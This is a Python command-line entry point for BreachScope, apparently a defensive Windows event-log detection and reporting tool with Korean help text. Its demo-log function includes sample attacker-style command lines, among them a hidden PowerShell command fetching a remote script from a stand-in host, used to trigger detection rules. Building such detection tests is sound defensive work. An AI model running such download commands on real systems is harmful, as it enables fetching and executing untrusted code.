import argparse
import os
import tempfile
import json
import logging
from datetime import datetime, timezone
from pathlib import Path
from .pipeline import run_pipeline
from .rules import load_rules
from .rulepack import summarize_rules
from .demo_scenarios import list_demo_scenarios, write_demo_scenario, write_all_demo_scenarios
from .ingest import convert_evtx_dir, collect_windows_logs
from .validator import validate_input

logger = logging.getLogger(__name__)


def _write_demo_logs() -> Path:
    tmpdir = Path(tempfile.mkdtemp(prefix="breachscope_demo_"))
    events = [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "host": "WS-01",
            "source": "ProcessCreate",
            "event_id": "4688",
            "user": "CORP\\\\alice",
            # 안전한 플레이스홀더. 규칙은 매칭되지만 악성 페이로드는 포함하지 않음
            "command_line": "powershell.exe -encodedcommand AAAABBBBCCCCDDDD",
        },
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "host": "WS-02",
            "source": "ProcessCreate",
            "event_id": "4688",
            "user": "CORP\\\\bob",
            "command_line": "powershell -NoP -W Hidden curl https://example.local/a.ps1",
        },
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "host": "WS-03",
            "source": "ProcessCreate",
            "event_id": "4688",
            "user": "CORP\\\\carol",
            "command_line": "cmd.exe /c echo Hello",
        },
    ]
    out = tmpdir / "events.jsonl"
    with out.open("w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")
    return tmpdir


def main():
    ap = argparse.ArgumentParser(
        description="BreachScope MVP 파이프라인 (한국어)")
    ap.add_argument("--input", help="입력 로그 폴더(JSONL 파일)")
    ap.add_argument("--rules", default="rules", help="규칙 폴더(YAML: .yml/.yaml) [기본값: rules]")
    ap.add_argument("--out", default="out/report", help="출력 경로 접두어(확장자 제외) [기본값: out/report]")
    ap.add_argument("--no-redact", action="store_true", help="보고서 민감 토큰 마스킹 비활성화")
    ap.add_argument("--demo", action="store_true", help="데모용 안전 샘플 로그 자동 생성 후 실행")
    ap.add_argument("--demo-scenario", help="내장 사고 시나리오 샘플 실행(ID 또는 all). --list-demo-scenarios로 확인")
    ap.add_argument("--list-demo-scenarios", action="store_true", help="내장 사고 시나리오 샘플 목록 출력 후 종료")
    ap.add_argument("--export-demo-scenarios", help="내장 사고 시나리오 JSONL 샘플을 지정 폴더에 생성 후 종료")
    ap.add_argument("--validate-rules", action="store_true", help="규칙만 검증하고 종료")
    ap.add_argument("--export-json", action="store_true", help="HTML 외에 JSON 리포트도 저장")
    ap.add_argument("--export-csv", action="store_true", help="CSV 리포트도 저장")
    ap.add_argument("--pdf", action="store_true", help="PDF 리포트 생성(WeasyPrint 구성 필요)")
    ap.add_argument("--validate-input", action="store_true", help="입력 로그(JSONL) 유효성 검사 후 종료")
    ap.add_argument("--min-severity", choices=["low","medium","high","critical"], help="최소 심각도 필터")
    ap.add_argument("--mitre-include", help="포함할 ATT&CK 코드 목록(쉼표 구분)")
    ap.add_argument("--mitre-exclude", help="제외할 ATT&CK 코드 목록(쉼표 구분)")
    ap.add_argument("--host-include", help="포함할 호스트 목록(쉼표 구분)")
    ap.add_argument("--open", action="store_true", help="생성 후 기본 브라우저로 HTML 리포트 열기")
    ap.add_argument("--ingest-evtx", action="store_true", help="입력 폴더의 .evtx 파일을 JSONL로 변환하여 분석")
    ap.add_argument("--collect-evtx", action="store_true", help="Windows 이벤트 로그를 자동으로 수집 (관리자 권한 권장)")
    ap.add_argument("--collect-logs", help="수집할 이벤트 로그 이름 (쉼표 구분, 예: Security,System,Application)")
    ap.add_argument("--collect-hours", type=int, help="최근 N시간의 이벤트만 수집")
    ap.add_argument("--fail-on-findings", action="store_true", help="탐지 발생 시 종료 코드를 1로 설정")
    ap.add_argument("--fail-threshold", type=int, default=0, help="탐지 건수가 임계값 이상이면 실패 처리")
    args = ap.parse_args()

    # breachscope.yaml 설정 파일을 자동 로드(있으면). CLI 인자가 우선.
    cfg = {}
    try:
        cfg_path = Path("breachscope.yaml")
        if cfg_path.exists():
            import yaml as _yaml
            cfg = _yaml.safe_load(cfg_path.read_text(encoding="utf-8")) or {}
    except Exception:
        cfg = {}

    def cfg_get(key, default=None):
        return cfg.get(key, default) if isinstance(cfg, dict) else default

    def arg_or_cfg(val, key):
        return val if val not in (None, False, "") else cfg_get(key)

    # 로깅 레벨 설정
    log_level = logging.DEBUG if args.demo else logging.INFO
    logging.basicConfig(level=log_level, format='%(levelname)s: %(message)s')

    if args.list_demo_scenarios:
        print("내장 사고 시나리오 샘플:")
        for row in list_demo_scenarios():
            print(f"- {row['id']}: {row['name']} ({row['events']} events, {', '.join(row['expected_techniques'])})")
        return

    if args.export_demo_scenarios:
        out_dir = write_all_demo_scenarios(Path(args.export_demo_scenarios))
        print(f"샘플 시나리오 생성 완료: {out_dir}")
        print(f"파일 수: {len(list(out_dir.glob('*.jsonl')))}")
        return

    if args.validate_rules:
        rules = load_rules(Path(arg_or_cfg(args.rules, "rules") or args.rules))
        coverage = summarize_rules(rules)
        print(f"규칙 개수: {len(rules)}")
        print(f"고유 ATT&CK 기법: {coverage['unique_techniques']}")
        print(f"Windows 핵심 기법 커버리지: {coverage['coverage_percent_core_windows']}%")
        for row in coverage.get("tactic_coverage", []):
            print(f"- {row['tactic']}: {row['rules']} rules / {', '.join(row['techniques'])}")
        return

    if args.validate_input:
        if args.demo_scenario:
            input_dir = write_demo_scenario(args.demo_scenario, Path(tempfile.mkdtemp(prefix="breachscope_scenario_")))
        elif args.demo:
            input_dir = _write_demo_logs()
        else:
            if not args.input:
                ap.error("--input, --demo, 또는 --demo-scenario 중 하나를 지정하세요.")
            input_dir = Path(args.input)
        res = validate_input(input_dir)
        print("입력 유효성 결과:")
        print(f"- 파일 수: {res['files']}")
        print(f"- 샘플 라인 수: {res['total_lines']} (limit {res['limit']})")
        print(f"- 파싱 성공: {res['parsed']}")
        print(f"- JSON 오류: {res['errors']['json']}")
        print(f"- 필수 필드 누락: {res['errors']['missing_fields']}")
        if res['missing_samples']:
            print("- 누락 예시 (최대 10건):")
            for s in res['missing_samples']:
                print(f"  * {s['file']}:{s['line']} - {s['missing']}")
        return

    # Windows 이벤트 로그 자동 수집
    if args.collect_evtx:
        log_names = None
        if args.collect_logs:
            log_names = [x.strip() for x in args.collect_logs.split(",") if x.strip()]

        collected_dir = collect_windows_logs(
            log_names=log_names,
            hours=args.collect_hours,
        )
        if collected_dir:
            input_dir = collected_dir
            print(f"✓ Windows 이벤트 로그 수집 완료: {collected_dir}")
            # 수집 후 자동으로 변환
            args.ingest_evtx = True
        else:
            print("✗ Windows 이벤트 로그 수집 실패")
            return 1

    if args.demo_scenario:
        input_dir = write_demo_scenario(args.demo_scenario, Path(tempfile.mkdtemp(prefix="breachscope_scenario_")))
        print(f"✓ 내장 시나리오 샘플 준비: {args.demo_scenario} -> {input_dir}")
    elif args.demo:
        input_dir = _write_demo_logs()
    else:
        if not args.input and not args.collect_evtx:
            ap.error("--input, --demo, --demo-scenario, 또는 --collect-evtx 중 하나를 지정하세요.")
        if args.input:
            input_dir = Path(args.input)
        elif not args.collect_evtx:
            ap.error("--input, --demo, 또는 --demo-scenario를 지정하세요.")

    # Optional EVTX ingestion
    if args.ingest_evtx:
        converted = convert_evtx_dir(input_dir)
        if converted:
            input_dir = converted
            print(f"✓ EVTX 변환 완료: {input_dir}")

    # 설정 파일에서 기본값 가져오기
    rules_dir = Path(arg_or_cfg(args.rules, "rules") or "rules")
    out_prefix = Path(arg_or_cfg(args.out, "out") or "out/report")
    out_prefix.parent.mkdir(parents=True, exist_ok=True)

    # 기본(ON): 보고서 민감 토큰 마스킹. 필요 시 비활성화 가능
    if args.no_redact:
        os.environ["BS_REDACT"] = "0"

    def split_csv(v: str | None):
        return [x.strip() for x in v.split(",") if x.strip()] if v else None

    html_path, count = run_pipeline(
        input_dir,
        rules_dir,
        out_prefix,
        export_json_flag=args.export_json,
        export_csv_flag=args.export_csv,
        render_pdf=args.pdf,
        min_severity=args.min_severity,
        mitre_include=split_csv(args.mitre_include),
        mitre_exclude=split_csv(args.mitre_exclude),
        host_include=split_csv(args.host_include),
    )
    print(f"리포트 생성: {html_path}")
    if args.export_json:
        print(f"JSON 리포트: {out_prefix.with_suffix('.json')}")
    if args.export_csv:
        print(f"CSV 리포트: {out_prefix.with_suffix('.csv')}")
    print(f"IOC CSV: {out_prefix.with_suffix('.iocs.csv')}")
    print(f"룰 카탈로그 CSV: {out_prefix.with_suffix('.rules.csv')}")
    print(f"케이스 ZIP: {out_prefix.with_suffix('.zip')}")
    if args.open:
        try:
            import webbrowser
            webbrowser.open(str(html_path))
        except Exception:
            pass

    # CI/자동화 친화적 종료 코드
    if args.fail_on_findings and count > 0:
        raise SystemExit(1)
    if args.fail_threshold and count >= args.fail_threshold:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
